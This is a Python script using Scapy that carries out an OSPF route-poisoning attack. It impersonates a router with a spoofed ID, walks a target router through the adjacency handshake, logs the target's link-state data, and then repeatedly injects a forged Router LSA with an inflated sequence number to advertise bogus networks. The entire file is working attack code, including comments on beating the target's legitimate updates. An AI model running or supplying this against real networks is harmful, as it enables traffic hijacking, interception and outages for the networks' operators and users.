from scapy.all import *
from scapy.contrib.ospf import *
import time
import struct
import threading
import os

state = "INIT"
poison_time = 0
last_lsupd_time = 0
lsa_seq_r = 0x80000001
router_info_logged = False

log_file_path = os.path.expanduser("~/Desktop/ospf_log.txt")

def log_to_file(data):
    with open(log_file_path, "a") as log_file:
        log_file.write(data + "\n")

def log_router_info(packet):
    if packet.haslayer(OSPF_Hdr):
        ospf_hdr = packet[OSPF_Hdr]
        router_info = (
            f"OSPF Packet from Router {ospf_hdr.src}:\n"
            f"  Version: {ospf_hdr.version}\n"
            f"  Area ID: {ospf_hdr.area}\n"
            f"  Packet Type: {ospf_hdr.type}\n"
        )
        log_to_file(router_info)

def log_dbd_flags(packet):
    if packet.haslayer(OSPF_DBDesc):
        dbd_layer = packet[OSPF_DBDesc]
        dbd_flags_info = (
            f"DBD Packet from Router {packet[IP].src}:\n"
            f"  Flags: {hex(dbd_layer.dbdescr)}\n"
            f"  Options: {hex(dbd_layer.options)}\n"
            f"  DD Sequence: {dbd_layer.ddseq}\n"
        )
        log_to_file(dbd_flags_info)

def log_lsa_details(packet):
    if packet.haslayer(OSPF_LSUpd):
        for lsa in packet[OSPF_LSUpd].lsalist:
            if isinstance(lsa, OSPF_Router_LSA):
                lsa_info = (
                    f"Router LSA from {lsa.adrouter}:\n"
                    f"  Sequence Number: {hex(lsa.seq)}\n"
                    f"  Age: {lsa.age}\n"
                    f"  Options: {hex(lsa.options)}\n"
                    f"  Links:\n"
                )
                for link in lsa.linklist:
                    lsa_info += f"    Type: {link.type}, ID: {link.id}, Metric: {link.metric}\n"
                log_to_file(lsa_info)

# Function to process received packets based on the ospf handshake state
def handle_packet(packet):
    
    global state
    global poison_time
    global last_lsupd_time
    global lsa_seq_r
    global router_info_logged
    
    if packet.haslayer(OSPF_Hdr):
        ospf_layer = packet.getlayer(OSPF_Hdr)
        if not router_info_logged:
            log_router_info(packet)
            router_info_logged = True

        # If in "INIT" state, send the hello packet
        if state == "INIT":
            send_hello()
            state = "HELLO_ED"
            print("HELLO_ED")
        
        # If in "HELLO_ED" state, handle the hello packet
        if state == "HELLO_ED" and ospf_layer.type == 1:
            print("Received OSPF Hello packet")
            send_hello_response(packet)
            state = "HELLO_RESPONDED"
            print("HELLO_RESPONDED")

        # If in "HELLO_RESPONDED" state, handle the DBD packet
        elif state == "HELLO_RESPONDED" and ospf_layer.type == 2:
            print("Received OSPF DBD packet")
            log_dbd_flags(packet)
            send_dbd_response(packet)
            state = "DBD_SENT"
            print("DBD_SENT")
        
        # If in "DBD_SENT" state, handle the DBD packet
        elif state == "DBD_SENT" and ospf_layer.type == 2:
            print("Received 2nd OSPF DBD packet")
            send_dbd_response_2(packet)
            state = "DBD_2_SENT"
            print("DBD_2_SENT")

        # If in "DBD_2_SENT" state, send the LS Request packet
        elif state == "DBD_2_SENT":
            send_ls_request(packet)
            state = "REQ_SENT"
            print("REQ_SENT")
        
        # If in "REQ_SENT" state and received the LS Update packet
        elif state == "REQ_SENT" and ospf_layer.type == 4:
            print("Received OSPF LS Update packet")
            log_lsa_details(packet)
            send_ls_r_upd_update(packet)
            state = "UPDATE_SENT"
            print("UPDATE_SENT")
        
        # If in "UPDATE_SENT" state, send the LS Update packet
        elif state == "UPDATE_SENT" and ospf_layer.type == 4:
            print("Received OSPF LS Update packet")
            send_ls_r_upd_update(packet)
            state = "UPDATE_2_SENT"
            print("UPDATE_2_SENT")
        
        # If in "DBD_SENT" or "REQ_SENT" state, handle the LS Update and Ack packet
        elif state == "UPDATE_2_SENT" or state == "UPDATE_SENT" and ospf_layer.type == 4:
            lsa_seq_r = packet[OSPF_LSA_Hdr].seq
            print("Received OSPF LS Update packet after Router Update sent")
            # send_ls_r_upd_upd_update(packet)
            send_ls_n_update()
            send_ls_ack_all()
            send_ls_ack_target()
            state = "ACK_SENT"
            print("ACK_SENT")
            
        elif state == "FULL" and ospf_layer.type == 1 and poison_time == 1:
            send_poison_packet(packet)
            state = "POISON_SENT"
            print("POISON_SENT")
        
        elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 4:
            print("Received LS Update despite FULL/DR status")    
            
            current_time = time.time()
            if current_time - last_lsupd_time >= 5:
                send_ls_r_upd_update(packet)
                # time.sleep(1)
                # send_ls_ack_target_2()
                last_lsupd_time = current_time
                print("Periodic LS Update response sent")
        
        elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 5:
            print("Received LS Ack despite FULL/DR status") 
            send_ls_ack_target_2()
        
        # If in "ACK_SENT" state, handle the LS Ack packet
        elif state == "ACK_SENT" or state == "UPDATE_SENT" or state == "UPDATE_2_SENT" and ospf_layer.type == 5:
            state = "FULL"
            print("FULL")
            send_periodic_hellos()
            # send_hello_neighbor()
            # time.sleep(5)
            poison_time = 1
        
        # elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 1:
            # send_hello_neighbor()
        
        elif state == "POISON_SENT" and ospf_layer.type == 4 or ospf_layer.type == 5 and poison_time == 1:
            state = "POISON_PROP"
            print("POISON_PROP")
            poison_time = 0
            while True:
                send_periodic_hellos_4ever()
            

# Function to send an OSPF Hello packet
def send_hello():
    ospf_hello = OSPF_Hello(
        mask="255.255.255.0",
        hellointerval=10,
        router="224.0.0.5",
        prio=1,
        options=0x22, 
        neighbors=[]
    )
    ospf_header_hello = OSPF_Hdr(
        version=2,
        type=1,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_hello = IP(
        src="192.168.10.99",
        dst="224.0.0.5"
    ) / ospf_header_hello / ospf_hello
    send(ospf_packet_hello, iface="eth0", verbose=1)
    
# Function to send a response to an OSPF Hello packet
def send_hello_response(received_packet):
    ospf_hello = OSPF_Hello(
        mask="255.255.255.0",
        hellointerval=10,
        router="192.168.10.99",
        prio=1,
        options=0x22, 
        neighbors=["1.1.1.1"]
    )
    ospf_header_hello = OSPF_Hdr(
        version=2,
        type=1,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_hello = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_hello / ospf_hello
    send(ospf_packet_hello, iface="eth0", verbose=1)

# Function to send a response to an OSPF Hello packet
def send_hello_neighbor():
    ospf_hello = OSPF_Hello(
        mask="255.255.255.0",
        hellointerval=10,
        router="192.168.10.99",
        backup="192.168.10.1",
        prio=1,
        options=0x22, 
        neighbors=["1.1.1.1"]
    )
    
    # Manual LLS Data Block
    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # TLV Type 1, Length 4, Option 0x00000001 (LSDB Resync)
    # lls_checksum = checksum(lls_data)
    # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
    
    lls_extended_opts = LLS_Extended_Options(
        options=b'\x00\x00\x00\x01'  # Setting the LSDB Resynchronization flag
    )
    
    ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
    
    ospf_header_hello = OSPF_Hdr(
        version=2,
        type=1,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_hello = IP(
        src="192.168.10.99",
        dst="224.0.0.5"
    ) / ospf_header_hello / ospf_hello / ospf_lls
    send(ospf_packet_hello, iface="eth0", verbose=1)

def send_dbd_response(received_packet):
    lsaheaders = []
    for lsa in received_packet[OSPF_DBDesc].lsaheaders:
        lsa_header = OSPF_LSA_Hdr(
            type=lsa.type,
            id=lsa.id,
            adrouter=lsa.adrouter,
            seq=lsa.seq
        )
        lsaheaders.append(lsa_header)
    
    ospf_dbd = OSPF_DBDesc(
        mtu=1500,
        options=0x22,
        ddseq=received_packet[OSPF_DBDesc].ddseq + 1,  #  sequence number
        dbdescr=0x07, # (I) Init, (M) More, (MS) Master
        lsaheaders=lsaheaders
    )
    ospf_header_dbd = OSPF_Hdr(
        version=2,
        type=2,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_dbd = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_dbd / ospf_dbd
    send(ospf_packet_dbd, iface="eth0", verbose=1)

def send_dbd_response_2(received_packet):
    
    ddseq = received_packet[OSPF_DBDesc].ddseq + 1 #  sequence number
    
    lsaheaders = []
    for lsa in received_packet[OSPF_DBDesc].lsaheaders:
        lsa_header = OSPF_LSA_Hdr(
            type=lsa.type,
            id=lsa.id,
            adrouter=lsa.adrouter,
            seq=lsa.seq
        )
        lsaheaders.append(lsa_header)
    
    # Manual LLS Data Block
    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # TLV Type 1, Length 4, Option 0x00000001 (LSDB Resync)
    # lls_checksum = checksum(lls_data)
    # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
    
    lls_extended_opts = LLS_Extended_Options(
        options=b'\x00\x00\x00\x01'  # Setting the LSDB Resynchronization flag
    )
    
    ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
    
    ospf_dbd = OSPF_DBDesc(
        mtu=1500,
        options=0x22,
        ddseq=ddseq,  
        dbdescr=0x01, # (MS) Master
        lsaheaders=lsaheaders
    )
    
    ospf_header_dbd = OSPF_Hdr(
        version=2,
        type=2,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_dbd = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_dbd / ospf_dbd / ospf_lls
    
    send(ospf_packet_dbd, iface="eth0", verbose=1)

def send_ls_request(received_packet):
    # Define OSPF LS Request Packet
    ospf_request = OSPF_LSReq(
        requests=[OSPF_LSReq_Item(type=1, id="1.1.1.1", adrouter="1.1.1.1")]
    )
    ospf_header_request = OSPF_Hdr(
        version=2,
        type=3,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_request = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_request / ospf_request
    send(ospf_packet_request, iface="eth0", verbose=1)


def send_ls_r_update(received_packet):
    ospf_update = OSPF_LSUpd(
        lsacount=1, # Number of LSAs in this update
        lsalist=[OSPF_Router_LSA(
        id="3.3.3.3", 
        adrouter="3.3.3.3", 
        seq=received_packet[OSPF_Router_LSA].seq+1, 
        age=1, 
        options=0x22, # 0x22 External Routing
        linklist=["3.3.3.3","10.0.0.0"])] # List of Networks available and their IDs
    )
    ospf_header_update = OSPF_Hdr(
        version=2,
        type=4,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_update = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_update / ospf_update
    
    time.sleep(1)
    
    send(ospf_packet_update, iface="eth0", verbose=1)

def send_ls_r_upd_update(received_packet):
    
    lsa = received_packet[OSPF_Router_LSA]
    lsa_seq = lsa.seq
    lsa_age = lsa.age
    
    linklist = []
    for link in lsa.linklist:
        parsed_link = OSPF_Link(
            type=link.type,
            id=link.id,
            data=link.data,
            metric=link.metric
        )
        linklist.append(parsed_link)
    
    ospf_update = OSPF_LSUpd(
        lsacount=1, # Number of LSAs in this update
        lsalist=[OSPF_Router_LSA(
        age = 1,
        id="3.3.3.3", 
        adrouter="3.3.3.3", 
        seq=lsa_seq, 
        options=0x22, # 0x22 is Demand Circuits, External Routing
        linklist=linklist)] # List of Networks available and their IDs
    )
    ospf_header_update = OSPF_Hdr(
        version=2,
        type=4,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_update = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_update / ospf_update
    
    send(ospf_packet_update, iface="eth0", verbose=1)

def send_ls_r_upd_upd_update(received_packet):
    
    global lsa_seq_r
    
    lsa = received_packet[OSPF_Router_LSA]
    lsa_seq = lsa.seq
    lsa_age = lsa.age
    lsa_seq_r = lsa_seq
    
    linklist = []
    for link in lsa.linklist:
        parsed_link = OSPF_Link(
            type=link.type,
            id=link.id,
            data=link.data,
            metric=link.metric
        )
        linklist.append(parsed_link)
    
    ospf_update = OSPF_LSUpd(
        lsacount=1, # Number of LSAs in this update
        lsalist=[OSPF_Router_LSA(
        age = 1,
        id="3.3.3.3", 
        adrouter="3.3.3.3", 
        seq=lsa_seq, 
        options=0x22, # 0x22 is Demand Circuits, External Routing
        linklist=linklist)] # List of Networks available and their IDs
    )
    ospf_header_update = OSPF_Hdr(
        version=2,
        type=4,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_update = IP(
        src="192.168.10.99",
        dst="224.0.0.5"
    ) / ospf_header_update / ospf_update
    
    send(ospf_packet_update, iface="eth0", verbose=1)

def send_ls_n_update():
    ospf_update = OSPF_LSUpd(
        lsacount=1,  # Number of LSAs in this update
        lsalist=[OSPF_Network_LSA(
            id="192.168.10.99",  # Network ID, copying pcap
            adrouter="3.3.3.3",  # Advertising router ID
            seq=0x80000001,  # Sequence number
            options=0x22,  # 0x22 represents External Routing capability
            mask="255.255.255.0",  # Subnet mask of the network
            routerlist=["1.1.1.1", "3.3.3.3"]  # List of Router IDs in this network
        )]
    )
    ospf_header_update = OSPF_Hdr(
        version=2,
        type=4,  # Type 4 is for LSA Update packets
        src="3.3.3.3",  # Spoofed source router ID (pretending to be the DR)
        area="0.0.0.0"  # OSPF Area ID
    )
    ospf_packet_update = IP(
        src="192.168.10.99",  # Spoofed source IP in the 10.0.0.0/24 network
        dst="224.0.0.5"  # Destination IP
    ) / ospf_header_update / ospf_update
    
    send(ospf_packet_update, iface="eth0", verbose=1)


def send_ls_ack_target():
    
    #lsa = received_packet[OSPF_LSA_Hdr]
    #lsa_seq = lsa.seq
    #lsa_age = lsa.age
    
    ospf_ack = OSPF_LSAck(
        lsaheaders=[
        OSPF_LSA_Hdr(
            type = 2,
            options=0x22,
            id="192.168.10.1",  # Network ID, copying pcap
            adrouter="1.1.1.1",  # Their router ID
            seq=0x80000005  # Sequence number (increment if re-sending)
            )
        ]
    )
    
    ospf_header_ack = OSPF_Hdr(
        version=2,
        type=5,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_ack = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_ack / ospf_ack
    send(ospf_packet_ack, iface="eth0", verbose=1)

def send_ls_ack_target_2():
    
    lsa = received_packet[OSPF_LSA_Hdr]
    lsa_seq = lsa.seq
    lsa_age = lsa.age
    
    ospf_ack = OSPF_LSAck(
        lsaheaders=[
        OSPF_LSA_Hdr(
            type = 1,
            age = lsa_age,
            options=0x22,
            id="1.1.1.1",  # Network ID, copying pcap
            adrouter="1.1.1.1",  # Their router ID
            seq=lsa_seq  # Sequence number (increment if re-sending)
            )
        ]
    )
    
    ospf_header_ack = OSPF_Hdr(
        version=2,
        type=5,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_ack = IP(
        src="192.168.10.99",
        dst="192.168.10.1"
    ) / ospf_header_ack / ospf_ack
    send(ospf_packet_ack, iface="eth0", verbose=1)

def send_ls_ack_all():
    
    global lsa_seq_r
    
    #lsa = received_packet[OSPF_LSA_Hdr]
    #lsa_seq = lsa.seq
    #lsa_age = lsa.age
    
    ospf_ack = OSPF_LSAck(
        lsaheaders=[
        OSPF_LSA_Hdr(
            type = 1,
            options=0x22,
            id="1.1.1.1",  # Network ID, copying pcap
            adrouter="1.1.1.1",  # Their router ID
            seq=lsa_seq_r  # Sequence number (increment if re-sending)
            )
        ]
    )
    
    ospf_header_ack = OSPF_Hdr(
        version=2,
        type=5,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    ospf_packet_ack = IP(
        src="192.168.10.99",
        dst="224.0.0.5"
    ) / ospf_header_ack / ospf_ack
    send(ospf_packet_ack, iface="eth0", verbose=1)


def send_poison_packet(received_packet):

    global lsa_seq_r
    
    lsa_seq = lsa_seq_r
    
    ospf_update = OSPF_LSUpd(
        lsacount=1, # Number of LSAs in this update
        lsalist=[OSPF_Router_LSA(
        age=1,
        id="3.3.3.3", 
        adrouter="3.3.3.3", 
        seq=lsa_seq + 99,
        options=0x22, # 0x22 is Demand Circuits, External Routing
        linklist=[
        OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
        OSPF_Link(type=2, id="192.168.20.0", data="255.255.255.0", metric=1),
        OSPF_Link(type=3, id="3.3.3.3", data="255.255.255.255", metric=1)
        ])]
    )
    
    ospf_header_update = OSPF_Hdr(
        version=2,
        type=4,
        src="3.3.3.3",
        area="0.0.0.0"
    )
    
    ospf_packet_update = IP(
        src="192.168.10.99",
        dst="224.0.0.5"
    ) / ospf_header_update / ospf_update
    
    send(ospf_packet_update, iface="eth0", verbose=1)
    time.sleep(2)
    send(ospf_packet_update, iface="eth0", verbose=1)
    time.sleep(2)
    send(ospf_packet_update, iface="eth0", verbose=1)
    time.sleep(2)
        

def send_periodic_hellos():
    # Once FULL state is reached, send periodic Hello packets
    print("Starting periodic Hello packets...")
    hello_count=0
    
    while hello_count < 5:
        send_hello_neighbor()
        hello_count += 1
        print(hello_count)
        time.sleep(10)    
    
    print("Sent 5 Hello packets.")

def send_periodic_hellos_4ever():
    print("Resuming periodic Hello packets...")
    
    while True:
        send_hello_neighbor()  # Send a Hello packet
        time.sleep(10)


# Start sniffing OSPF packets and handle them
while True:
    while state != "POISON_PROP":
        print("Started sniffing packets...")
        sniff(filter="ip proto ospf and not src host 192.168.10.99", iface="eth0", prn=handle_packet)


# seq numbers must be correct (master-slave rel, master increments the sequence)
# options field must be correct (match INIT, master-slave rel)
# all variable names must be correct (lsa_header, linklist, adrouter)
# ospf LLS TLV defined by OSPF_LLS_Hdr
# seq must not be incremented in LSUpd unless there is a change in link-states
# age must not be greater than 1 or else our Upd will be superseded by an LSUpd from target
